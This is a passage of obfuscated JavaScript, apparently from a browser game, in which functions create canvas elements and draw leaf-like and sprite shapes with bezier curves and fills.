			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ], Ⲇᐃ[ᐃⲆᐃ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * 35.83332824707031, 8.078125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 34.83332824707031, 27.078125 * ᐃ, ᐃ * 28.833328247070312, ᐃ * 27.078125, ᐃ * 23.833328247070312, 28.078125 * ᐃ);
			Δ.bezierCurveTo(21.833328247070312 * ᐃ, ᐃ * 14.078125, 26.833328247070312 * ᐃ, 11.078125 * ᐃ, ᐃ * 35.83332824707031, ᐃ * 8.078125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ], Ⲇᐃ[1], ⲆⵠΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(25.833328247070312 * ᐃ, ᐃ * 39.078125);
			Δ.bezierCurveTo(20.833328247070312 * ᐃ, ᐃ * 29.078125, 14.833328247070312 * ᐃ, 27.078125 * ᐃ, ᐃ * 5.8333282470703125, 29.078125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 9.833328247070312, 39.078125 * ᐃ, ᐃ * 16.833328247070312, ᐃ * 42.078125, ᐃ * 25.833328247070312, ᐃ * 40.078125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔΔᐃⵠ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 42.83332824707031, ᐃ * 23.078125);
			Δ.bezierCurveTo(35.83332824707031 * ᐃ, ᐃ * 35.078125, ᐃ * 31.833328247070312, 37.078125 * ᐃ, 25.833328247070312 * ᐃ, 36.078125 * ᐃ);
			Δ.bezierCurveTo(25.833328247070312 * ᐃ, ᐃ * 24.078125, 33.83332824707031 * ᐃ, 21.078125 * ᐃ, 42.83332824707031 * ᐃ, ᐃ * 23.078125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ], Ⲇᐃ[1], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 23.833328247070312, ᐃ * 24.078125);
			Δ.bezierCurveTo(20.833328247070312 * ᐃ, ᐃ * 34.078125, 23.833328247070312 * ᐃ, ᐃ * 40.078125, 27.833328247070312 * ᐃ, 43.078125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 37.33332824707031, 28.078125 * ᐃ, 37.33332824707031 * ᐃ, ᐃ * 28.078125, ᐃ * 46.83332824707031, ᐃ * 13.078125);
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 38.83332824707031, ᐃ * 14.078125);
			Δ.bezierCurveTo(34.83332824707031 * ᐃ, ᐃ * 24.078125, ᐃ * 34.83332824707031, ᐃ * 24.078125, 30.833328247070312 * ᐃ, ᐃ * 34.078125);
			ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[1], 2 * ᐃ);
			return Ⲇⵠ
		}

		function ⲆⵠⵠⲆⲆᐃⵠ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 193 * ᐃ;
			var ⵠⵠᐃ = 198 * ᐃ;
			var Δⵠ = 140 * ᐃ;
			var ⲆⵠⲆ = 90 * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var ΔⵠΔΔ = ᐃ * 10;
			var ⲆᐃⵠᐃΔ = ᐃ * 25;
			var Δᐃⵠᐃⵠ = 180 * ᐃ;
			var ⵠⲆᐃⵠΔ = ⲆᐃⵠᐃΔ / ⵠⲆⵠⲆ;
			var ⵠᐃⲆⵠⲆ = Δᐃⵠᐃⵠ / ⵠⲆⵠⲆ;
			var ⵠⲆⵠ = 4 * ᐃ;
			Δ.translate(-25 * ᐃ, ᐃ * 1);
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			Δ.rotate(-Math.PI / ΔⵠⲆⲆ);
			Ⲇᐃᐃ(Δ, -ⵠⲆᐃⵠΔ, -ⵠᐃⲆⵠⲆ, ⲆᐃⵠᐃΔ, Δᐃⵠᐃⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠᐃⵠΔ], ⵠⲆⵠ);
			Δ.translate(-30 * ᐃ, ᐃ * -25);
			Δ.rotate(Math.PI / ΔΔⵠΔ);
			Ⲇᐃᐃ(Δ, -ⵠⲆᐃⵠΔ, -ⵠᐃⲆⵠⲆ, ⲆᐃⵠᐃΔ, Δᐃⵠᐃⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[1], ⵠⲆⵠ);
			Δ.translate(35 * ᐃ, 30 * ᐃ);
			Δ.rotate(Math.PI / ⵠᐃⵠⲆ);
			Ⲇᐃᐃ(Δ, -ⵠⲆᐃⵠΔ, -ⵠᐃⲆⵠⲆ, ⲆᐃⵠᐃΔ, Δᐃⵠᐃⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ], Ⲇᐃ[1], ⵠⲆⵠ);
			return Ⲇⵠ
		}

		function ᐃⲆⵠᐃΔⵠᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 145 * ᐃ;
			var ⵠⵠᐃ = 145 * ᐃ;
			var Δⵠ = ᐃⵠⵠ / 2;
			var ⲆⵠⲆ = ⵠⵠᐃ / Ⲇᐃᐃⵠ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var ⲆⲆⵠ = ᐃ * 70;
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			Δ.globalAlpha = .4;
			ⵠᐃᐃ(Δ, Δᐃᐃᐃ, 0, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			var ⲆⲆⵠ = ᐃ * 50;
			Δ.translate(0, ΔⲆⲆ);
			Δ.globalAlpha = .8;
			ⵠᐃᐃ(Δ, 0, 0, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			var ⲆⲆⵠ = 35 * ᐃ;
			Δ.translate(Δᐃᐃⵠ, ΔΔⵠ);
			Δ.globalAlpha = .8;
			ⵠᐃᐃ(Δ, 0, ⵠΔⲆⵠ, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[1]);
			var ⲆⲆⵠ = ΔⲆᐃᐃᐃⲆⲆ * ᐃ;
			Δ.translate(0, 0);
			Δ.globalAlpha = .8;
			ⵠᐃᐃ(Δ, ΔⲆⵠⲆ, ΔⲆⲆ, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠᐃ]);
			return Ⲇⵠ
		}

		function ⲆⲆᐃΔⲆΔΔⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 400 * ᐃ;
			Ⲇⵠ.height = ᐃ * 400;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(101 * ᐃ, Ⲇᐃᐃᐃⵠⵠⵠ * ᐃ);
			Δ.bezierCurveTo(113 * ᐃ, ᐃ * 243, 179 * ᐃ, 210 * ᐃ, 219 * ᐃ, ᐃ * 196);
			Δ.bezierCurveTo(252 * ᐃ, ᐃ * 203, 288 * ᐃ, ᐃ * 215, 318 * ᐃ, 233 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 304, ᐃ * 254, 258 * ᐃ, 273 * ᐃ, ᐃ * 215, ᐃ * 296);
			Δ.bezierCurveTo(ᐃ * 161, ᐃ * 287, ᐃ * 119, ᐃ * 270, 102 * ᐃ, 257 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ], Ⲇᐃ[ⵠΔᐃ], ᐃ * 14);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(99 * ᐃ, 258 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 99, ᐃ * 272.5, 99 * ᐃ, ᐃ * 272.5, 99 * ᐃ, 287 * ᐃ);
			Δ.bezierCurveTo(166 * ᐃ, ᐃ * 319, ᐃ * 193, ᐃ * 320, 212 * ᐃ, ᐃ * 324);
			Δ.bezierCurveTo(292 * ᐃ, 286 * ᐃ, 312 * ᐃ, ᐃ * 271, ᐃ * 319, 263 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 320, 249 * ᐃ, ᐃ * 320, 241 * ᐃ, ᐃ * 318, 234 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 300, ᐃ * 254, 254 * ᐃ, 277 * ᐃ, 216 * ᐃ, ᐃ * 294);
			Δ.bezierCurveTo(ᐃ * 190, ᐃ * 296, ᐃ * 135, 276 * ᐃ, ᐃ * 102, 258 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[1], ΔᐃΔⲆⲆⲆⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 212, 323 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 211.5, ᐃ * 310.5, 211.5 * ᐃ, ᐃ * 310.5, ᐃ * 211, 298 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], ᐃ * 14);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(212 * ᐃ, ᐃ * 210);
			Δ.bezierCurveTo(286 * ᐃ, ᐃ * 210, 331 * ᐃ, ᐃ * 254, ᐃ * 212, 276 * ᐃ);
			Δ.bezierCurveTo(108 * ᐃ, 276 * ᐃ, ᐃ * 112, ᐃ * 222, ᐃ * 213, ᐃ * 208);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[Ⲇᐃⵠᐃ], ᐃ * ⲆⵠⲆⵠΔⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(98 * ᐃ, ᐃ * 200);
			Δ.bezierCurveTo(ᐃ * 126, ᐃ * 216, ᐃ * 177, 232 * ᐃ, 213 * ᐃ, 237 * ᐃ);
			Δ.bezierCurveTo(266 * ᐃ, 218 * ᐃ, 288 * ᐃ, 209 * ᐃ, ᐃ * 318, ᐃ * 190);
			Δ.bezierCurveTo(ᐃ * 269, ᐃ * 164, 239 * ᐃ, 158 * ᐃ, 214 * ᐃ, ᐃ * 153);
			Δ.bezierCurveTo(148 * ᐃ, 172 * ᐃ, ᐃ * 131, ᐃ * 182, 98 * ᐃ, 200 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ], Ⲇᐃ[1], ΔⲆᐃᐃᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(97 * ᐃ, ᐃ * 204);
			Δ.bezierCurveTo(ᐃ * 97, ᐃ * 215.5, 97 * ᐃ, 215.5 * ᐃ, 97 * ᐃ, ᐃ * 227);
			Δ.bezierCurveTo(148 * ᐃ, ᐃ * 250, 179 * ᐃ, 256 * ᐃ, ᐃ * 212, ᐃ * 262);
			Δ.bezierCurveTo(ᐃ * 268, 244 * ᐃ, 281 * ᐃ, ᐃ * 233, ᐃ * 318, ᐃ * 214);
			Δ.bezierCurveTo(ᐃ * 318, 203 * ᐃ, 318 * ᐃ, ᐃ * 203, ᐃ * 318, 192 * ᐃ);
			Δ.bezierCurveTo(250 * ᐃ, ᐃ * 225, ᐃ * 236, ᐃ * 231, ᐃ * 214, ᐃ * 239);
			Δ.bezierCurveTo(158 * ᐃ, ᐃ * 228, 126 * ᐃ, 215 * ᐃ, ᐃ * 99, ᐃ * 201);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔᐃ], Ⲇᐃ[1], 14 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(212 * ᐃ, ᐃ * 260);
			Δ.bezierCurveTo(212 * ᐃ, ᐃ * 251.5, 212 * ᐃ, ᐃ * 251.5, 212 * ᐃ, ᐃ * 243);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠΔⲆ], ᐃΔᐃⲆⲆ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 161, 201 * ᐃ, ᐃⲆⵠᐃⲆ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, 216 * ᐃ, ᐃ * 205, ᐃ * 8.06225774829855);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔΔ]);
			ⵠᐃᐃ(Δ, ᐃ * 216, ᐃ * 175, ᐃ * 6.708203932499369);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, ᐃ * 271, 191 * ᐃ, ᐃ * 5.0990195135927845);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, ᐃ * 206, ᐃ * 180, ᐃ * 11.180339887498949);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			return Ⲇⵠ
		}

		function ᐃⵠⵠᐃⵠⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 170;
			Ⲇⵠ.height = ᐃ * 173;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃⲆᐃ;
			Δ.translate(ᐃ * 5, ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(85.25 * ᐃ, ᐃ * 82.953125);
			Δ.bezierCurveTo(98.25 * ᐃ, 46.453125 * ᐃ, ᐃ * 98.25, 46.453125 * ᐃ, 111.25 * ᐃ, 9.953125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[0], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(111.25 * ᐃ, ᐃ * 8.953125);
			Δ.bezierCurveTo(117.75 * ᐃ, 12.453125 * ᐃ, 117.75 * ᐃ, ᐃ * 12.453125, ᐃ * 124.25, ᐃ * 15.953125);
			Δ.bezierCurveTo(113.75 * ᐃ, 39.953125 * ᐃ, ᐃ * 113.75, 39.953125 * ᐃ, 103.25 * ᐃ, 63.953125 * ᐃ);
			Δ.bezierCurveTo(97.75 * ᐃ, ᐃ * 64.953125, 97.75 * ᐃ, ᐃ * 64.953125, 92.25 * ᐃ, 65.953125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔΔ]);
			Δ.globalAlpha = 1;
			Δ.translate(-ⵠⵠΔⵠ * ᐃ, ᐃ * -ⲆⲆΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(111.25 * ᐃ, 8.953125 * ᐃ);
			Δ.bezierCurveTo(117.75 * ᐃ, 12.453125 * ᐃ, ᐃ * 117.75, ᐃ * 12.453125, 124.25 * ᐃ, 15.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 113.75, ᐃ * 39.953125, 113.75 * ᐃ, ᐃ * 39.953125, ᐃ * 103.25, 63.953125 * ᐃ);
			Δ.bezierCurveTo(97.75 * ᐃ, ᐃ * 64.953125, 97.75 * ᐃ, 64.953125 * ᐃ, ᐃ * 92.25, ᐃ * 65.953125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 85.25, 82.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 98.25, 46.453125 * ᐃ, 98.25 * ᐃ, ᐃ * 46.453125, ᐃ * 111.25, 9.953125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[6], ᐃ * ΔΔⵠⵠΔ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃ * ᐃΔΔⲆ, 5 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 87.25, ᐃ * 84.953125);
			Δ.bezierCurveTo(123.75 * ᐃ, ᐃ * 100.453125, 123.75 * ᐃ, 100.453125 * ᐃ, ᐃ * 160.25, ᐃ * 115.953125);
			Δ.closePath();
			ΔⲆ(Δ, ⵠⵠΔⵠΔ, Ⲇᐃ[Δᐃᐃᐃ], ΔΔⵠⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 160.25, 114.953125 * ᐃ);
			Δ.bezierCurveTo(156.25 * ᐃ, 122.453125 * ᐃ, 156.25 * ᐃ, ᐃ * 122.453125, 152.25 * ᐃ, ᐃ * 129.953125);
			Δ.bezierCurveTo(ᐃ * 130.25, 117.953125 * ᐃ, 130.25 * ᐃ, 117.953125 * ᐃ, 108.25 * ᐃ, ᐃ * 105.953125);
			Δ.bezierCurveTo(ᐃ * 107.25, ᐃ * 98.953125, ᐃ * 107.25, 98.953125 * ᐃ, ᐃ * 106.25, ᐃ * 91.953125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(-5 * ᐃ, -ᐃᐃⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 160.25, ᐃ * 114.953125);
			Δ.bezierCurveTo(156.25 * ᐃ, ᐃ * 122.453125, 156.25 * ᐃ, 122.453125 * ᐃ, 152.25 * ᐃ, 129.953125 * ᐃ);
			Δ.bezierCurveTo(130.25 * ᐃ, ᐃ * 117.953125, ᐃ * 130.25, 117.953125 * ᐃ, 108.25 * ᐃ, ᐃ * 105.953125);
			Δ.bezierCurveTo(107.25 * ᐃ, ᐃ * 98.953125, ᐃ * 107.25, ᐃ * 98.953125, ᐃ * 106.25, ᐃ * 91.953125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 87.25, ᐃ * 84.953125);
			Δ.bezierCurveTo(ᐃ * 123.75, 100.453125 * ᐃ, ᐃ * 123.75, 100.453125 * ᐃ, 160.25 * ᐃ, ᐃ * 115.953125);
			Δ.closePath();
			ΔⲆ(Δ, ⵠⵠΔⵠΔ, Ⲇᐃ[6], ΔΔⵠⵠΔ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃΔᐃⲆ;
			Δ.translate(ᐃ * 5, ᐃⲆⵠΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(83.25 * ᐃ, ᐃ * 83.953125);
			Δ.bezierCurveTo(ᐃ * 47.75, ᐃ * 68.453125, ᐃ * 47.75, ᐃ * 68.453125, 12.25 * ᐃ, ᐃ * 52.953125);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠⲆⲆ], ᐃ * ⲆᐃᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 13.25, 53.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 17.25, ᐃ * 46.953125, 17.25 * ᐃ, 46.953125 * ᐃ, 21.25 * ᐃ, ᐃ * 39.953125);
			Δ.bezierCurveTo(42.75 * ᐃ, 52.453125 * ᐃ, 42.75 * ᐃ, ᐃ * 52.453125, ᐃ * 64.25, 64.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 64.25, ᐃ * 70.953125, 64.25 * ᐃ, ᐃ * 70.953125, 64.25 * ᐃ, 76.953125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔΔΔ;
			Δ.translate(-ⵠᐃΔⲆ * ᐃ, -ⵠⵠΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(13.25 * ᐃ, 53.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 17.25, 46.953125 * ᐃ, 17.25 * ᐃ, ᐃ * 46.953125, 21.25 * ᐃ, ᐃ * 39.953125);
			Δ.bezierCurveTo(42.75 * ᐃ, 52.453125 * ᐃ, ᐃ * 42.75, 52.453125 * ᐃ, 64.25 * ᐃ, ᐃ * 64.953125);
			Δ.bezierCurveTo(ᐃ * 64.25, ᐃ * 70.953125, 64.25 * ᐃ, ᐃ * 70.953125, 64.25 * ᐃ, ᐃ * 76.953125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 83.25, 83.953125 * ᐃ);
			Δ.bezierCurveTo(47.75 * ᐃ, ᐃ * 68.453125, 47.75 * ᐃ, 68.453125 * ᐃ, ᐃ * 12.25, ᐃ * 52.953125);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⵠΔΔΔΔⵠⲆ], ᐃ * 4);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃᐃⲆΔ;
			Δ.translate(ᐃⲆⵠⵠ * ᐃ, ᐃ * 5);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(84.25 * ᐃ, ᐃ * 86.953125);
			Δ.bezierCurveTo(70.25 * ᐃ, 123.953125 * ᐃ, 70.25 * ᐃ, ᐃ * 123.953125, 56.25 * ᐃ, ᐃ * 160.953125);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⲆᐃ, Ⲇᐃ[0], ⲆⵠᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 56.25, 159.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 49.25, ᐃ * 155.453125, 49.25 * ᐃ, 155.453125 * ᐃ, 42.25 * ᐃ, 150.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 54.25, ᐃ * 127.953125, ᐃ * 54.25, 127.953125 * ᐃ, 66.25 * ᐃ, ᐃ * 104.953125);
			Δ.bezierCurveTo(71.25 * ᐃ, 104.953125 * ᐃ, 71.25 * ᐃ, ᐃ * 104.953125, ᐃ * 76.25, ᐃ * 104.953125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(-ᐃΔΔΔ * ᐃ, -ⵠᐃΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 56.25, 159.953125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 49.25, 155.453125 * ᐃ, 49.25 * ᐃ, ᐃ * 155.453125, 42.25 * ᐃ, ᐃ * 150.953125);
			Δ.bezierCurveTo(ᐃ * 54.25, ᐃ * 127.953125, 54.25 * ᐃ, ᐃ * 127.953125, ᐃ * 66.25, 104.953125 * ᐃ);
			Δ.bezierCurveTo(71.25 * ᐃ, 104.953125 * ᐃ, ᐃ * 71.25, 104.953125 * ᐃ, 76.25 * ᐃ, ᐃ * 104.953125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(84.25 * ᐃ, 86.953125 * ᐃ);
			Δ.bezierCurveTo(70.25 * ᐃ, 123.953125 * ᐃ, 70.25 * ᐃ, ᐃ * 123.953125, ᐃ * 56.25, ᐃ * 160.953125);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[6], 4 * ᐃ);
			return Ⲇⵠ
		}
		const ΔᐃⲆⵠ = ΔⵠΔⵠ;

		function ᐃᐃⲆΔᐃⵠΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 155;
			Ⲇⵠ.height = ᐃ * 127;
			Δ.globalAlpha = .5;
			Δ.translate(ⵠⲆᐃⵠ, 8 * ᐃ);
			Δ.translate(ᐃ * -7, -ᐃᐃⵠⵠⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(55 * ᐃ, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 86, 64 * ᐃ, 117 * ᐃ, 66 * ᐃ, 134 * ᐃ, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 152, ᐃ * 69, ᐃ * 165, 86 * ᐃ, ᐃ * 152, 104 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 146, ᐃ * 87, ᐃ * 122, 89 * ᐃ, 98 * ᐃ, 90 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 64, 89 * ᐃ, ᐃ * 41, 91 * ᐃ, 36 * ᐃ, 106 * ᐃ);
			Δ.bezierCurveTo(19 * ᐃ, 92 * ᐃ, 31 * ᐃ, 71 * ᐃ, 54 * ᐃ, 69 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -ΔⲆᐃⵠⲆΔⵠ);
			Δ.translate(ᐃ * 7, ᐃ * 20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(24 * ᐃ, ᐃ * 28);
			Δ.bezierCurveTo(39 * ᐃ, ᐃ * 30, 37 * ᐃ, ᐃ * 31, 40 * ᐃ, ᐃ * 32);
			Δ.bezierCurveTo(ᐃ * 22, 45 * ᐃ, ᐃ * 26, 58 * ᐃ, 29 * ᐃ, ᐃ * 66);
			Δ.bezierCurveTo(86.5 * ᐃ, ᐃ * 65, ᐃ * 86.5, ᐃ * 65, 144 * ᐃ, 64 * ᐃ);
			Δ.bezierCurveTo(151 * ᐃ, ᐃ * 42, ᐃ * 132, ᐃ * 20, ᐃ * 120, ᐃ * 16);
			Δ.bezierCurveTo(106 * ᐃ, 12 * ᐃ, ᐃ * 89, ᐃ * 0, 73 * ᐃ, ᐃ * Δⵠᐃⵠ);
			Δ.bezierCurveTo(51 * ᐃ, ᐃ * 5, 36 * ᐃ, ⵠⵠⵠⲆᐃ * ᐃ, 25 * ᐃ, ᐃ * 28);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ], Ⲇᐃ[2], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 30, ᐃ * 41);
			Δ.bezierCurveTo(49 * ᐃ, 31 * ᐃ, 53 * ᐃ, ᐃ * 29, 62 * ᐃ, 27 * ᐃ);
